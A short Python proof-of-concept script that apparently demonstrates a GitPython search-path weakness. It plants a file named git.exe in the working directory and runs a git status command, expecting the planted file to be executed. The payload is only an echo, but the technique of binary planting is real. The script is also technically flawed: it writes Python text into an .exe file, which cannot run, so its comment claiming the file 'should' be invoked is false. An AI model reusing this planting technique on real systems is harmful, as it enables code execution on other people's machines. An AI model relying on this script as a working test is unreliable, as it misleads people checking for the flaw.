import os
import git  # This is GitPython

# Assume the current working directory contains a malicious git.exe
# For demonstration, we will create a simple malicious git.exe

# Create a malicious git.exe
malicious_git_path = os.path.join(os.getcwd(), 'git.exe')
with open(malicious_git_path, 'w') as f:
    f.write("# Malicious code here\n")
    f.write("import os\n")
    f.write("os.system('echo Malicious code executed!')\n")

# Now we will run a Git command using GitPython
try:
    repo = git.Repo('.')
    print(repo.git.status())  # This should invoke the malicious git.exe
except Exception as e:
    print(f"Error: {e}")